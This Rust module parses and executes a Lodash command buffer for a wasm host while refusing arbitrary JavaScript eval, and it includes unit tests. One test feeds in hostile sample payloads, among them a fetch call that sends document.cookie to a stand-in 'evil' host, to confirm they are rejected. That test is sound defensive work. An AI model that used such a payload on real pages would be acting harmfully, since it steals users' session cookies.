// Copyright (c) 2026 Etienne Cimon
// SPDX-License-Identifier: MIT

//! First-party JS backend for `libwasm.lodash` (B67).
//!
//! `struct Lodash` (`browser-ui/libwasm/source/libwasm/lodash.d:325`) does not
//! call JS directly. It appends to a **command buffer** and ships it through one
//! of the twelve `ldexec_*` imports. This module parses that buffer and executes
//! it over a bounded [`JsValue`] model — the "JS backend" the chain pipes into.
//!
//! ## Why there is no `eval` here
//!
//! The reference browser host evaluates `=(…)` parameters with `eval()`
//! (`bindings.ts:1126`, `:1178`). That cannot ship in a BIOS. It is also
//! unnecessary, and the reason is the important architectural point:
//!
//! When a Lodash iteratee is a D delegate, `putLocal`
//! (`lodash.d:606,614,621,628,635`) emits one of **five fixed, compiler-generated
//! arrow functions**. They are not user JavaScript. Every one of them does the
//! same thing — box the arguments, call the guest's indirect function table at
//! `cbPtr` with `cbCtx`, coerce the result to `bool`:
//!
//! ```text
//! (o,s)=>{let hndl=ao(o);let str=es(0,s,null,true);return !!sifg(cbPtr)(cbCtx,str[0],str[1],hndl);}
//! ```
//!
//! So the host recognises these by identity and dispatches to the **guest**
//! instead of evaluating anything. The iteratee runs in wasm, where the D
//! delegate already lives. Any other `=(…)` payload is refused
//! ([`LodashError::EvalRefused`]) — that is where `eval` stays closed.

use std::collections::BTreeMap;

/// Bounded budgets. A chain is a bounded transaction like every other g6b lane.
pub const MAX_COMMANDS: usize = 256;
pub const MAX_COMMAND_BYTES: usize = 64 * 1024;
pub const MAX_PARAMS: usize = 5;
pub const MAX_COLLECTION: usize = 4096;
pub const MAX_STRING: usize = 64 * 1024;

/// The five iteratee boilerplates libwasm generates for a D delegate.
/// Matching one means "call the guest", never "evaluate JavaScript".
pub const CB_BOILERPLATE: [&str; 5] = [
    "(o,s)=>{let hndl=ao(o);let str=es(0,s,null,true);return !!sifg(cbPtr)(cbCtx,str[0],str[1],hndl);}",
    "(o,i)=>{let hndl=ao(o);return !!sifg(cbPtr)(cbCtx,BigInt(i),hndl);}",
    "(s1,s2)=>{let str1=es(0,s1,null,true);let str2=es(0,s2,null,true);return !!sifg(cbPtr)(cbCtx,str2[0],str2[1],str1[0],str1[1]);}",
    "(s,i)=>{let str=es(0,s,null,true);return !!sifg(cbPtr)(cbCtx,BigInt(i),str[0],str[1]);}",
    "(i1,i2)=>{return !!sifg(cbPtr)(cbCtx, BigInt(i2), BigInt(i1));}",
];

/// A bounded JavaScript value. Deliberately not a JS object graph: no
/// prototypes, no functions as values, no cycles.
#[derive(Debug, Clone, PartialEq)]
pub enum JsValue {
    Undefined,
    Null,
    Bool(bool),
    Num(f64),
    Str(String),
    Arr(Vec<JsValue>),
    Obj(BTreeMap<String, JsValue>),
    /// An opaque host object-table handle the backend must not dereference.
    Handle(i32),
}

impl JsValue {
    /// JavaScript truthiness, as Lodash predicates rely on it.
    pub fn truthy(&self) -> bool {
        match self {
            JsValue::Undefined | JsValue::Null => false,
            JsValue::Bool(b) => *b,
            JsValue::Num(n) => *n != 0.0 && !n.is_nan(),
            JsValue::Str(s) => !s.is_empty(),
            JsValue::Arr(_) | JsValue::Obj(_) => true,
            JsValue::Handle(h) => *h != 0,
        }
    }

    /// `String(v)` for the subset that can appear here.
    pub fn to_js_string(&self) -> String {
        match self {
            JsValue::Undefined => "undefined".into(),
            JsValue::Null => "null".into(),
            JsValue::Bool(b) => b.to_string(),
            JsValue::Num(n) => format_number(*n),
            JsValue::Str(s) => s.clone(),
            JsValue::Arr(items) => items
                .iter()
                .map(|v| match v {
                    JsValue::Null | JsValue::Undefined => String::new(),
                    other => other.to_js_string(),
                })
                .collect::<Vec<_>>()
                .join(","),
            JsValue::Obj(_) => "[object Object]".into(),
            JsValue::Handle(h) => format!("[handle {h}]"),
        }
    }

    /// `Number(v)`; `NaN` where JavaScript would produce it.
    pub fn to_number(&self) -> f64 {
        match self {
            JsValue::Undefined => f64::NAN,
            JsValue::Null => 0.0,
            JsValue::Bool(b) => f64::from(u8::from(*b)),
            JsValue::Num(n) => *n,
            JsValue::Str(s) => {
                let t = s.trim();
                if t.is_empty() {
                    0.0
                } else {
                    t.parse().unwrap_or(f64::NAN)
                }
            }
            JsValue::Arr(_) | JsValue::Obj(_) => f64::NAN,
            JsValue::Handle(h) => f64::from(*h),
        }
    }
}

/// `1` not `1.0`, matching JS number formatting for integral values.
fn format_number(n: f64) -> String {
    if n.is_nan() {
        return "NaN".into();
    }
    if n.is_infinite() {
        return if n > 0.0 { "Infinity" } else { "-Infinity" }.into();
    }
    if n == n.trunc() && n.abs() < 1e21 {
        return format!("{}", n as i64);
    }
    let s = format!("{n}");
    s
}

/// A parsed parameter. `Callback` is a recognised guest iteratee, never JS.
#[derive(Debug, Clone, PartialEq)]
pub enum Param {
    Value(JsValue),
    Callback,
}

/// One entry of the command buffer.
#[derive(Debug, Clone, PartialEq)]
pub enum Command {
    /// `{"local": name, "value": v}` — a temporary binding.
    Local { name: String, value: Param },
    /// `{"func": name, "params": [...]}` — a chain step.
    Func { name: String, params: Vec<Param> },
}

#[derive(Debug, Clone, PartialEq)]
pub enum LodashError {
    /// `=(…)` that is not a recognised libwasm iteratee boilerplate.
    EvalRefused(String),
    /// A Lodash method outside the implemented set.
    UnsupportedMethod(String),
    /// A guest iteratee was required but the host cannot re-enter the module.
    CallbackUnavailable(String),
    Malformed(String),
    Budget(String),
    Thrown(String),
}

impl std::fmt::Display for LodashError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            LodashError::EvalRefused(s) => {
                write!(f, "libwasm lodash refuses host eval of {s:?}: only the generated iteratee boilerplate is dispatchable")
            }
            LodashError::UnsupportedMethod(s) => write!(f, "libwasm lodash method {s:?} is not implemented"),
            LodashError::CallbackUnavailable(s) => write!(f, "libwasm lodash {s:?} needs a guest iteratee and this host cannot re-enter the module"),
            LodashError::Malformed(s) => write!(f, "malformed libwasm lodash command buffer: {s}"),
            LodashError::Budget(s) => write!(f, "libwasm lodash budget exceeded: {s}"),
            LodashError::Thrown(s) => write!(f, "libwasm lodash chain threw: {s}"),
        }
    }
}

type R<T> = Result<T, LodashError>;

fn malformed(s: impl Into<String>) -> LodashError {
    LodashError::Malformed(s.into())
}

/// Parse the JSON array produced by `Lodash.putCommand` / `putLocal`.
///
/// Parameter strings carry a one-character sigil (`lodash.d:417-475`):
/// `=true` / `=false` / `=null` / `=undefined` / `=123` / `=(…)` for a function
/// expression, `\=` escaping a literal that starts with `=`, and a bare string
/// otherwise.
pub fn parse_commands(src: &str) -> R<Vec<Command>> {
    if src.len() > MAX_COMMAND_BYTES {
        return Err(LodashError::Budget(format!(
            "command buffer {} bytes exceeds {MAX_COMMAND_BYTES}",
            src.len()
        )));
    }
    let mut p = Parser {
        b: src.as_bytes(),
        i: 0,
    };
    p.ws();
    p.expect(b'[')?;
    let mut out = Vec::new();
    p.ws();
    if p.peek() == Some(b']') {
        p.i += 1;
        return Ok(out);
    }
    loop {
        if out.len() >= MAX_COMMANDS {
            return Err(LodashError::Budget(format!(
                "more than {MAX_COMMANDS} commands"
            )));
        }
        out.push(p.command()?);
        p.ws();
        match p.next() {
            Some(b',') => p.ws(),
            Some(b']') => break,
            _ => return Err(malformed("expected , or ] between commands")),
        }
        // A trailing comma before `]` is produced by putCommand and trimmed by
        // `execute`, but tolerate it rather than failing a well-formed chain.
        if p.peek() == Some(b']') {
            p.i += 1;
            break;
        }
    }
    Ok(out)
}

struct Parser<'a> {
    b: &'a [u8],
    i: usize,
}

impl Parser<'_> {
    fn peek(&self) -> Option<u8> {
        self.b.get(self.i).copied()
    }
    fn next(&mut self) -> Option<u8> {
        let c = self.peek();
        if c.is_some() {
            self.i += 1;
        }
        c
    }
    fn ws(&mut self) {
        while matches!(self.peek(), Some(b' ' | b'\t' | b'\n' | b'\r')) {
            self.i += 1;
        }
    }
    fn expect(&mut self, c: u8) -> R<()> {
        if self.next() == Some(c) {
            Ok(())
        } else {
            Err(malformed(format!("expected {:?}", c as char)))
        }
    }
    fn string(&mut self) -> R<String> {
        self.expect(b'"')?;
        let mut s = String::new();
        loop {
            match self
                .next()
                .ok_or_else(|| malformed("unterminated string"))?
            {
                b'"' => break,
                b'\\' => {
                    let e = self.next().ok_or_else(|| malformed("dangling escape"))?;
                    s.push(match e {
                        b'"' => '"',
                        b'\\' => '\\',
                        b'/' => '/',
                        b'n' => '\n',
                        b't' => '\t',
                        b'r' => '\r',
                        b'b' => '\u{8}',
                        b'f' => '\u{c}',
                        other => return Err(malformed(format!("bad escape \\{}", other as char))),
                    });
                }
                c => {
                    // Re-collect UTF-8 continuation bytes verbatim.
                    let start = self.i - 1;
                    let len = utf8_len(c);
                    if len > 1 {
                        self.i = start + len;
                        if self.i > self.b.len() {
                            return Err(malformed("truncated UTF-8 in string"));
                        }
                    }
                    let slice = &self.b[start..self.i];
                    s.push_str(std::str::from_utf8(slice).map_err(|_| malformed("invalid UTF-8"))?);
                }
            }
            if s.len() > MAX_STRING {
                return Err(LodashError::Budget("string parameter too long".into()));
            }
        }
        Ok(s)
    }
    fn number(&mut self) -> R<f64> {
        let start = self.i;
        if self.peek() == Some(b'-') {
            self.i += 1;
        }
        while matches!(self.peek(), Some(c) if c.is_ascii_digit() || c == b'.' || c == b'e' || c == b'E' || c == b'+' || c == b'-')
        {
            self.i += 1;
        }
        std::str::from_utf8(&self.b[start..self.i])
            .ok()
            .and_then(|s| s.parse().ok())
            .ok_or_else(|| malformed("bad number"))
    }
    fn command(&mut self) -> R<Command> {
        self.expect(b'{')?;
        self.ws();
        let key = self.string()?;
        self.ws();
        self.expect(b':')?;
        self.ws();
        match key.as_str() {
            "local" => {
                let name = self.string()?;
                self.ws();
                self.expect(b',')?;
                self.ws();
                if self.string()? != "value" {
                    return Err(malformed("local without value"));
                }
                self.ws();
                self.expect(b':')?;
                self.ws();
                let value = self.param()?;
                self.ws();
                self.expect(b'}')?;
                Ok(Command::Local { name, value })
            }
            "func" => {
                let name = self.string()?;
                self.ws();
                self.expect(b',')?;
                self.ws();
                if self.string()? != "params" {
                    return Err(malformed("func without params"));
                }
                self.ws();
                self.expect(b':')?;
                self.ws();
                self.expect(b'[')?;
                let mut params = Vec::new();
                self.ws();
                if self.peek() == Some(b']') {
                    self.i += 1;
                } else {
                    loop {
                        if params.len() >= MAX_PARAMS {
                            return Err(LodashError::Budget(format!(
                                "more than {MAX_PARAMS} parameters"
                            )));
                        }
                        params.push(self.param()?);
                        self.ws();
                        match self.next() {
                            Some(b',') => self.ws(),
                            Some(b']') => break,
                            _ => return Err(malformed("expected , or ] in params")),
                        }
                    }
                }
                self.ws();
                self.expect(b'}')?;
                Ok(Command::Func { name, params })
            }
            other => Err(malformed(format!("unknown command key {other:?}"))),
        }
    }
    fn param(&mut self) -> R<Param> {
        match self.peek() {
            Some(b'"') => {
                let raw = self.string()?;
                Ok(sigil(&raw)?)
            }
            Some(b't') if self.b[self.i..].starts_with(b"true") => {
                self.i += 4;
                Ok(Param::Value(JsValue::Bool(true)))
            }
            Some(b'f') if self.b[self.i..].starts_with(b"false") => {
                self.i += 5;
                Ok(Param::Value(JsValue::Bool(false)))
            }
            Some(b'n') if self.b[self.i..].starts_with(b"null") => {
                self.i += 4;
                Ok(Param::Value(JsValue::Null))
            }
            Some(c) if c == b'-' || c.is_ascii_digit() => {
                Ok(Param::Value(JsValue::Num(self.number()?)))
            }
            _ => Err(malformed("unsupported parameter token")),
        }
    }
}

fn utf8_len(b: u8) -> usize {
    match b {
        0x00..=0x7f => 1,
        0xc0..=0xdf => 2,
        0xe0..=0xef => 3,
        _ => 4,
    }
}

/// Decode the `=`/`\=` sigil convention into a value or a guest callback.
fn sigil(raw: &str) -> R<Param> {
    if let Some(rest) = raw.strip_prefix('\\') {
        // `\=literal` — an ordinary string that happens to start with '='.
        return Ok(Param::Value(JsValue::Str(rest.to_string())));
    }
    let Some(expr) = raw.strip_prefix('=') else {
        return Ok(Param::Value(JsValue::Str(raw.to_string())));
    };
    Ok(Param::Value(match expr {
        "true" => JsValue::Bool(true),
        "false" => JsValue::Bool(false),
        "null" => JsValue::Null,
        "undefined" => JsValue::Undefined,
        "cb" => return Ok(Param::Callback),
        _ if CB_BOILERPLATE.contains(&expr) => return Ok(Param::Callback),
        _ if expr.starts_with('(') || expr.contains('(') || expr.ends_with(';') => {
            return Err(LodashError::EvalRefused(expr.to_string()))
        }
        _ => match expr.parse::<f64>() {
            Ok(n) => JsValue::Num(n),
            // A bare `=name` is a `_.get(window, name)` lookup in the reference
            // host. There is no `window` here; the BoardSpec scope is B63.
            Err(_) => return Err(LodashError::EvalRefused(expr.to_string())),
        },
    }))
}

/// Guest iteratee dispatch. Implemented by a host that can re-enter the wasm
/// instance's indirect function table; `None` means the chain must fail closed
/// rather than silently drop the predicate.
pub trait Iteratee {
    /// Call the guest delegate with `(value, key_or_index)`, returning its
    /// boolean result.
    fn call(&mut self, value: &JsValue, key: &JsValue) -> Result<bool, String>;
}

/// Methods this backend implements. Anything else fails closed by name.
pub const SUPPORTED: &[&str] = &[
    "defaultTo",
    "identity",
    "toString",
    "toNumber",
    "size",
    "first",
    "head",
    "last",
    "keys",
    "values",
    "reverse",
    "compact",
    "uniq",
    "flatten",
    "sortBy",
    "join",
    "trim",
    "toUpper",
    "toLower",
    "capitalize",
    "sum",
    "min",
    "max",
    "chunk",
    "take",
    "drop",
    "nth",
    "get",
    "includes",
    "indexOf",
    "concat",
    "filter",
    "reject",
    "map",
    "find",
    "every",
    "some",
    "countBy",
];

/// Execute a parsed chain over `init`.
pub fn execute(init: JsValue, commands: &[Command], cb: Option<&mut dyn Iteratee>) -> R<JsValue> {
    let mut acc = init;
    let mut locals: BTreeMap<String, JsValue> = BTreeMap::new();
    let mut cb = cb;
    for command in commands {
        match command {
            Command::Local { name, value } => {
                let v = match value {
                    Param::Value(v) => v.clone(),
                    // The `cb` local only names the callback; it has no value.
                    Param::Callback => continue,
                };
                locals.insert(name.clone(), v);
            }
            Command::Func { name, params } => {
                acc = step(&acc, name, params, &mut cb, &locals)?;
            }
        }
    }
    Ok(acc)
}

fn as_list(v: &JsValue) -> Vec<JsValue> {
    match v {
        JsValue::Arr(items) => items.clone(),
        JsValue::Obj(map) => map.values().cloned().collect(),
        JsValue::Str(s) => s.chars().map(|c| JsValue::Str(c.to_string())).collect(),
        JsValue::Undefined | JsValue::Null => Vec::new(),
        other => vec![other.clone()],
    }
}

fn keys_of(v: &JsValue) -> Vec<JsValue> {
    match v {
        JsValue::Arr(items) => (0..items.len()).map(|i| JsValue::Num(i as f64)).collect(),
        JsValue::Obj(map) => map.keys().map(|k| JsValue::Str(k.clone())).collect(),
        other => (0..as_list(other).len())
            .map(|i| JsValue::Num(i as f64))
            .collect(),
    }
}

fn need<'p>(params: &'p [Param], i: usize, m: &str) -> R<&'p JsValue> {
    match params.get(i) {
        Some(Param::Value(v)) => Ok(v),
        Some(Param::Callback) => Err(malformed(format!(
            "{m} got a callback where a value is required"
        ))),
        None => Err(malformed(format!("{m} is missing parameter {i}"))),
    }
}

fn predicate(m: &str, params: &[Param], cb: &mut Option<&mut dyn Iteratee>) -> R<PredicateKind> {
    match params.first() {
        None => Ok(PredicateKind::Truthy),
        Some(Param::Callback) if cb.is_some() => Ok(PredicateKind::Guest),
        Some(Param::Callback) => Err(LodashError::CallbackUnavailable(m.to_string())),
        Some(Param::Value(JsValue::Str(prop))) => Ok(PredicateKind::Property(prop.clone())),
        Some(Param::Value(_)) => Err(malformed(format!(
            "{m} predicate must be an iteratee or a property name"
        ))),
    }
}

enum PredicateKind {
    Guest,
    Truthy,
    Property(String),
}

fn test(
    kind: &PredicateKind,
    value: &JsValue,
    key: &JsValue,
    cb: &mut Option<&mut dyn Iteratee>,
) -> R<bool> {
    match kind {
        PredicateKind::Truthy => Ok(value.truthy()),
        PredicateKind::Property(p) => Ok(match value {
            JsValue::Obj(map) => map.get(p).map(JsValue::truthy).unwrap_or(false),
            _ => false,
        }),
        PredicateKind::Guest => {
            let f = cb
                .as_mut()
                .ok_or_else(|| LodashError::CallbackUnavailable("iteratee".into()))?;
            f.call(value, key).map_err(LodashError::Thrown)
        }
    }
}

fn step(
    acc: &JsValue,
    name: &str,
    params: &[Param],
    cb: &mut Option<&mut dyn Iteratee>,
    locals: &BTreeMap<String, JsValue>,
) -> R<JsValue> {
    let list = || -> R<Vec<JsValue>> {
        let items = as_list(acc);
        if items.len() > MAX_COLLECTION {
            return Err(LodashError::Budget(format!(
                "collection of {} exceeds {MAX_COLLECTION}",
                items.len()
            )));
        }
        Ok(items)
    };
    Ok(match name {
        "identity" => acc.clone(),
        "defaultTo" => {
            let fallback = need(params, 0, "defaultTo")?;
            match acc {
                JsValue::Undefined | JsValue::Null => fallback.clone(),
                JsValue::Num(n) if n.is_nan() => fallback.clone(),
                other => other.clone(),
            }
        }
        "toString" => JsValue::Str(acc.to_js_string()),
        "toNumber" => JsValue::Num(acc.to_number()),
        "size" => JsValue::Num(match acc {
            JsValue::Str(s) => s.chars().count() as f64,
            other => as_list(other).len() as f64,
        }),
        "first" | "head" => list()?.first().cloned().unwrap_or(JsValue::Undefined),
        "last" => list()?.last().cloned().unwrap_or(JsValue::Undefined),
        "nth" => {
            let items = list()?;
            let i = need(params, 0, "nth")?.to_number();
            let i = if i < 0.0 { items.len() as f64 + i } else { i };
            items.get(i as usize).cloned().unwrap_or(JsValue::Undefined)
        }
        "keys" => JsValue::Arr(keys_of(acc)),
        "values" => JsValue::Arr(list()?),
        "reverse" => {
            let mut items = list()?;
            items.reverse();
            JsValue::Arr(items)
        }
        "compact" => JsValue::Arr(list()?.into_iter().filter(JsValue::truthy).collect()),
        "uniq" => {
            let mut out: Vec<JsValue> = Vec::new();
            for v in list()? {
                if !out.contains(&v) {
                    out.push(v);
                }
            }
            JsValue::Arr(out)
        }
        "flatten" => {
            let mut out = Vec::new();
            for v in list()? {
                match v {
                    JsValue::Arr(inner) => out.extend(inner),
                    other => out.push(other),
                }
            }
            JsValue::Arr(out)
        }
        "sortBy" => {
            let mut items = list()?;
            items.sort_by_key(|a| a.to_js_string());
            JsValue::Arr(items)
        }
        "join" => {
            let sep = match params.first() {
                Some(Param::Value(v)) => v.to_js_string(),
                _ => ",".into(),
            };
            JsValue::Str(
                list()?
                    .iter()
                    .map(JsValue::to_js_string)
                    .collect::<Vec<_>>()
                    .join(&sep),
            )
        }
        "concat" => {
            let mut items = list()?;
            for p in params {
                match p {
                    Param::Value(JsValue::Arr(inner)) => items.extend(inner.clone()),
                    Param::Value(v) => items.push(v.clone()),
                    Param::Callback => return Err(malformed("concat does not take an iteratee")),
                }
            }
            JsValue::Arr(items)
        }
        "chunk" => {
            let n = need(params, 0, "chunk")?.to_number().max(1.0) as usize;
            JsValue::Arr(
                list()?
                    .chunks(n)
                    .map(|c| JsValue::Arr(c.to_vec()))
                    .collect(),
            )
        }
        "take" => {
            let n = need(params, 0, "take")?.to_number().max(0.0) as usize;
            JsValue::Arr(list()?.into_iter().take(n).collect())
        }
        "drop" => {
            let n = need(params, 0, "drop")?.to_number().max(0.0) as usize;
            JsValue::Arr(list()?.into_iter().skip(n).collect())
        }
        "trim" => JsValue::Str(acc.to_js_string().trim().to_string()),
        "toUpper" => JsValue::Str(acc.to_js_string().to_uppercase()),
        "toLower" => JsValue::Str(acc.to_js_string().to_lowercase()),
        "capitalize" => {
            let s = acc.to_js_string();
            let mut c = s.chars();
            JsValue::Str(match c.next() {
                Some(f) => f.to_uppercase().collect::<String>() + &c.as_str().to_lowercase(),
                None => String::new(),
            })
        }
        "sum" => JsValue::Num(list()?.iter().map(JsValue::to_number).sum()),
        "min" => list()?
            .into_iter()
            .reduce(|a, b| if b.to_number() < a.to_number() { b } else { a })
            .unwrap_or(JsValue::Undefined),
        "max" => list()?
            .into_iter()
            .reduce(|a, b| if b.to_number() > a.to_number() { b } else { a })
            .unwrap_or(JsValue::Undefined),
        "includes" => {
            let needle = need(params, 0, "includes")?;
            JsValue::Bool(match acc {
                JsValue::Str(s) => s.contains(&needle.to_js_string()),
                other => as_list(other).contains(needle),
            })
        }
        "indexOf" => {
            let needle = need(params, 0, "indexOf")?;
            JsValue::Num(
                list()?
                    .iter()
                    .position(|v| v == needle)
                    .map(|i| i as f64)
                    .unwrap_or(-1.0),
            )
        }
        "get" => {
            let path = need(params, 0, "get")?.to_js_string();
            let mut cur = acc.clone();
            for seg in path.split('.') {
                cur = match &cur {
                    JsValue::Obj(map) => map.get(seg).cloned().unwrap_or(JsValue::Undefined),
                    JsValue::Arr(items) => seg
                        .parse::<usize>()
                        .ok()
                        .and_then(|i| items.get(i).cloned())
                        .unwrap_or(JsValue::Undefined),
                    _ => JsValue::Undefined,
                };
            }
            // `_.get(obj, path, default)` honours a third argument.
            match (&cur, params.get(1)) {
                (JsValue::Undefined, Some(Param::Value(d))) => d.clone(),
                _ => cur,
            }
        }
        "filter" | "reject" | "find" | "every" | "some" | "map" | "countBy" => {
            let kind = predicate(name, params, cb)?;
            let items = list()?;
            let keys = keys_of(acc);
            let mut kept = Vec::new();
            let mut counts: BTreeMap<String, JsValue> = BTreeMap::new();
            for (i, v) in items.iter().enumerate() {
                let key = keys.get(i).cloned().unwrap_or(JsValue::Num(i as f64));
                let hit = test(&kind, v, &key, cb)?;
                match name {
                    "filter" if hit => kept.push(v.clone()),
                    "reject" if !hit => kept.push(v.clone()),
                    "find" if hit => return Ok(v.clone()),
                    "every" if !hit => return Ok(JsValue::Bool(false)),
                    "some" if hit => return Ok(JsValue::Bool(true)),
                    // `map` over a boolean iteratee is the predicate's result;
                    // a value-returning iteratee is not representable in the
                    // `bool delegate` ABI libwasm generates.
                    "map" => kept.push(JsValue::Bool(hit)),
                    "countBy" => {
                        let k = if hit { "true" } else { "false" };
                        let e = counts.entry(k.into()).or_insert(JsValue::Num(0.0));
                        *e = JsValue::Num(e.to_number() + 1.0);
                    }
                    _ => {}
                }
            }
            match name {
                "find" => JsValue::Undefined,
                "every" => JsValue::Bool(true),
                "some" => JsValue::Bool(false),
                "countBy" => JsValue::Obj(counts),
                _ => JsValue::Arr(kept),
            }
        }
        other => {
            // A local of the same name is not a method; surface the real cause.
            if locals.contains_key(other) {
                return Err(malformed(format!("{other:?} is a local, not a method")));
            }
            return Err(LodashError::UnsupportedMethod(other.to_string()));
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn run(init: JsValue, src: &str) -> R<JsValue> {
        execute(init, &parse_commands(src)?, None)
    }

    #[test]
    fn parses_the_sigil_convention_the_d_writer_emits() {
        let cmds = parse_commands(
            r#"[{"func":"defaultTo","params":["=null"]},{"func":"join","params":["-"]},{"func":"take","params":[3]},{"func":"includes","params":["=true"]},{"func":"get","params":["\\=literal"]}]"#,
        )
        .unwrap();
        assert_eq!(cmds.len(), 5);
        assert_eq!(
            cmds[0],
            Command::Func {
                name: "defaultTo".into(),
                params: vec![Param::Value(JsValue::Null)]
            }
        );
        assert_eq!(
            cmds[1],
            Command::Func {
                name: "join".into(),
                params: vec![Param::Value(JsValue::Str("-".into()))]
            }
        );
        assert_eq!(
            cmds[2],
            Command::Func {
                name: "take".into(),
                params: vec![Param::Value(JsValue::Num(3.0))]
            }
        );
        assert_eq!(
            cmds[3],
            Command::Func {
                name: "includes".into(),
                params: vec![Param::Value(JsValue::Bool(true))]
            }
        );
        // `\=literal` is a string, not an eval request.
        assert_eq!(
            cmds[4],
            Command::Func {
                name: "get".into(),
                params: vec![Param::Value(JsValue::Str("=literal".into()))]
            }
        );
    }

    #[test]
    fn the_five_generated_iteratees_are_callbacks_not_eval() {
        for boilerplate in CB_BOILERPLATE {
            let src = format!(
                r#"[{{"local":"cb","value":"={boilerplate}"}},{{"func":"filter","params":["=cb"]}}]"#
            );
            let cmds = parse_commands(&src).expect("generated boilerplate must parse");
            assert_eq!(
                cmds[0],
                Command::Local {
                    name: "cb".into(),
                    value: Param::Callback
                },
                "boilerplate must be recognised, never evaluated"
            );
            assert_eq!(
                cmds[1],
                Command::Func {
                    name: "filter".into(),
                    params: vec![Param::Callback]
                }
            );
        }
    }

    #[test]
    fn arbitrary_javascript_is_refused_by_name() {
        for hostile in [
            "=(()=>{fetch('http://evil/'+document.cookie)})()",
            "=window.location",
            "=alert(1);",
        ] {
            let src = format!(r#"[{{"func":"filter","params":["{hostile}"]}}]"#);
            let err = parse_commands(&src).unwrap_err();
            assert!(
                matches!(err, LodashError::EvalRefused(_)),
                "{hostile} -> {err}"
            );
            assert!(err.to_string().contains("refuses host eval"));
        }
    }

    #[test]
    fn value_chains_execute_without_any_callback() {
        let list = JsValue::Arr(vec![
            JsValue::Num(3.0),
            JsValue::Num(0.0),
            JsValue::Num(1.0),
            JsValue::Num(3.0),
        ]);
        assert_eq!(
            run(list.clone(), r#"[{"func":"compact","params":[]},{"func":"uniq","params":[]},{"func":"join","params":["-"]}]"#).unwrap(),
            JsValue::Str("3-1".into())
        );
        assert_eq!(
            run(list.clone(), r#"[{"func":"sum","params":[]}]"#).unwrap(),
            JsValue::Num(7.0)
        );
        assert_eq!(
            run(list, r#"[{"func":"size","params":[]}]"#).unwrap(),
            JsValue::Num(4.0)
        );
        assert_eq!(
            run(
                JsValue::Null,
                r#"[{"func":"defaultTo","params":["fallback"]}]"#
            )
            .unwrap(),
            JsValue::Str("fallback".into())
        );
        assert_eq!(
            run(JsValue::Str("  BIOS  ".into()), r#"[{"func":"trim","params":[]},{"func":"toLower","params":[]},{"func":"capitalize","params":[]}]"#).unwrap(),
            JsValue::Str("Bios".into())
        );
    }

    #[test]
    fn a_guest_iteratee_is_dispatched_once_per_element() {
        struct Even(Vec<f64>);
        impl Iteratee for Even {
            fn call(&mut self, value: &JsValue, _key: &JsValue) -> Result<bool, String> {
                self.0.push(value.to_number());
                Ok(value.to_number() % 2.0 == 0.0)
            }
        }
        let cmds =
            parse_commands(r#"[{"local":"cb","value":"=cb"},{"func":"filter","params":["=cb"]}]"#)
                .unwrap();
        let mut cb = Even(Vec::new());
        let out = execute(
            JsValue::Arr((1..=4).map(|i| JsValue::Num(f64::from(i))).collect()),
            &cmds,
            Some(&mut cb),
        )
        .unwrap();
        assert_eq!(cb.0, vec![1.0, 2.0, 3.0, 4.0], "called once per element");
        assert_eq!(
            out,
            JsValue::Arr(vec![JsValue::Num(2.0), JsValue::Num(4.0)])
        );
    }

    #[test]
    fn a_chain_needing_a_callback_fails_closed_when_the_host_cannot_reenter() {
        let cmds = parse_commands(r#"[{"func":"find","params":["=cb"]}]"#).unwrap();
        let err = execute(JsValue::Arr(vec![JsValue::Num(1.0)]), &cmds, None).unwrap_err();
        assert!(matches!(err, LodashError::CallbackUnavailable(_)), "{err}");
        assert!(err.to_string().contains("cannot re-enter"));
    }

    #[test]
    fn a_guest_iteratee_that_throws_aborts_the_chain() {
        struct Boom;
        impl Iteratee for Boom {
            fn call(&mut self, _: &JsValue, _: &JsValue) -> Result<bool, String> {
                Err("guest trap".into())
            }
        }
        let cmds = parse_commands(r#"[{"func":"every","params":["=cb"]}]"#).unwrap();
        let err = execute(
            JsValue::Arr(vec![JsValue::Num(1.0)]),
            &cmds,
            Some(&mut Boom),
        )
        .unwrap_err();
        assert_eq!(err, LodashError::Thrown("guest trap".into()));
    }

    #[test]
    fn unsupported_methods_and_budgets_fail_closed_by_name() {
        let err = run(JsValue::Null, r#"[{"func":"mapValues","params":[]}]"#).unwrap_err();
        assert_eq!(err, LodashError::UnsupportedMethod("mapValues".into()));
        assert!(err.to_string().contains("not implemented"));

        let many = format!(
            "[{}]",
            vec![r#"{"func":"size","params":[]}"#; 300].join(",")
        );
        assert!(matches!(
            parse_commands(&many).unwrap_err(),
            LodashError::Budget(_)
        ));

        let big = JsValue::Arr(vec![JsValue::Num(1.0); MAX_COLLECTION + 1]);
        assert!(matches!(
            run(big, r#"[{"func":"uniq","params":[]}]"#).unwrap_err(),
            LodashError::Budget(_)
        ));
    }

    #[test]
    fn malformed_buffers_never_panic() {
        let base = r#"[{"local":"cb","value":"=cb"},{"func":"filter","params":["=cb",3]}]"#;
        for end in 0..base.len() {
            let _ = parse_commands(&base[..end]);
        }
        for bad in [
            "",
            "[",
            "[]x",
            "[{}]",
            r#"[{"func":1}]"#,
            r#"[{"nope":"x"}]"#,
        ] {
            let _ = parse_commands(bad);
        }
        assert!(parse_commands("[]").unwrap().is_empty());
    }

    #[test]
    fn every_advertised_method_is_reachable() {
        for m in SUPPORTED {
            let src = format!(r#"[{{"func":"{m}","params":["x","y"]}}]"#);
            let cmds = parse_commands(&src).unwrap();
            let out = execute(JsValue::Arr(vec![JsValue::Str("a".into())]), &cmds, None);
            // It may legitimately reject its arguments, but never as "unsupported".
            if let Err(e) = out {
                assert!(
                    !matches!(e, LodashError::UnsupportedMethod(_)),
                    "{m} is advertised but unimplemented"
                );
            }
        }
    }
}
